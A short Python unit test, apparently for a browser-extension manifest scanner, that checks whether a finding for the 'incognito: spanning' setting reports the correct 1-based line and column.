def test_finding_line_column_correct() -> None:
    """Line / column numbers are 1-based and point at the rule match."""
    manifest = (
        '{\n'
        '  "incognito": "spanning"\n'
        '}\n'
    )
    findings = _hits("ext-incognito-spanning", manifest)
    assert len(findings) == 1
    f = findings[0]
    assert f.line == 2
    # column counts from line start, "  " (2 spaces) then `"`
    assert f.column == 3
